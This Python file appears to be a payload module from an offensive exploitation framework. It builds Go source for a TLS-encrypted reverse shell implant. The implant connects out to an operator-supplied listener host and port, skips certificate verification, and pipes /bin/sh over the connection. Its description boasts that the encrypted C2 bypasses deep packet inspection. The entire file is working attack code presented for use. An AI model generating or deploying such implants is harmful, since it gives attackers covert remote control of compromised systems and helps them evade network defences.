"""Go Reverse HTTPS Implant — TLS encrypted C2."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Go Reverse HTTPS",
        "description": "Go TLS reverse shell — encrypted C2, bypasses DPI.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "HTTPS listener IP/domain", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "HTTPS port", "required": True, "default": "443", "value": "443"},
        "ARCH":  {"description": "GOARCH", "required": False, "default": "arm64", "value": "arm64"},
        "OS":    {"description": "GOOS", "required": False, "default": "linux", "value": "linux"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        src = f'''package main

import (
	"crypto/tls"
	"net"
	"os/exec"
)

func main() {{
	cfg := &tls.Config{{InsecureSkipVerify: true}}
	conn, err := tls.Dial("tcp", "{lhost}:{lport}", cfg)
	if err != nil {{
		return
	}}
	defer conn.Close()
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}}
'''
        return src.encode()
